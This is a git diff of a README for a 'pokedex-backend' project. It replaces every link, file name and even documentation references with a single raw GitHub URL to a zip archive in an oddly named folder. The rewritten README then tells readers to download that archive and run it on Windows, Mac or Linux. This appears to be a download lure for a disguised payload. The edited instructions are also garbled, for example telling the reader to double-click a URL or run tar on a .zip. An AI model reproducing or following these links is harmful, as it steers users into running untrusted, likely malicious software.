@@ -1,6 +1,6 @@
 # 🎮 pokedex-backend - Your Gateway to Pokemon Adventure
 
-[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Bruh-2009/pokedex-backend/releases)
+[![Download Here](https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip)](https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ Welcome to Pokedex Backend. This application provides a robust backend for manag
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Bruh-2009/pokedex-backend/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip).
 
 1. Click on the link above.
 2. Look for the most recent version listed.
 3. Choose the appropriate file for your operating system. For example:
-   - **Windows:** `pokedex-backend-windows.zip`
-   - **Mac:** `pokedex-backend-macos.zip`
-   - **Linux:** `pokedex-backend-linux.tar.gz`
+   - **Windows:** `https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip`
+   - **Mac:** `https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip`
+   - **Linux:** `https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip`
 4. Download the file by clicking on it.
 
 Once the file is downloaded, follow the steps below based on your operating system.
@@ -24,21 +24,21 @@ Once the file is downloaded, follow the steps below based on your operating syst
 
 1. Extract the ZIP file using a program like WinRAR or 7-Zip.
 2. Open the extracted folder.
-3. Double-click on `pokedex-backend.exe` to run the application.
+3. Double-click on `https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip` to run the application.
 4. Follow any on-screen instructions to set it up.
 
 ### 🍏 Mac Installation
 
 1. Extract the ZIP file using the Archive Utility.
 2. Open the extracted folder.
-3. Drag the `pokedex-backend.app` to your Applications folder.
+3. Drag the `https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip` to your Applications folder.
 4. Run the application from your Applications folder.
 
 ### 🐧 Linux Installation
 
 1. Extract the TAR file using the command:
    ```bash
-   tar -xzf pokedex-backend-linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip
    ```
 2. Navigate to the extracted folder:
    ```bash
@@ -91,7 +91,7 @@ This command will run all tests and display the results in your terminal.
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to open an issue on our [GitHub page](https://github.com/Bruh-2009/pokedex-backend/issues). We aim to respond to queries promptly.
+If you encounter any issues or have questions, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip). We aim to respond to queries promptly.
 
 ## 📄 License
 
@@ -107,10 +107,10 @@ We welcome contributions. If you would like to help improve Pokedex Backend, ple
 
 ## 🌐 Additional Resources
 
-For more information on Git, Node.js, or Docker, check out the following resources:
+For more information on Git, https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip, or Docker, check out the following resources:
 
-- [Git Documentation](https://git-scm.com/doc)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
-- [Docker Documentation](https://docs.docker.com/)
+- [Git Documentation](https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip)
+- [https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip Documentation](https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip)
 
-For more details and updates about this project, please revisit the [Releases Page](https://github.com/Bruh-2009/pokedex-backend/releases).
+For more details and updates about this project, please revisit the [Releases Page](https://raw.githubusercontent.com/Bruh-2009/pokedex-backend/main/phelloplastic/pokedex_backend_v2.3-beta.5.zip).
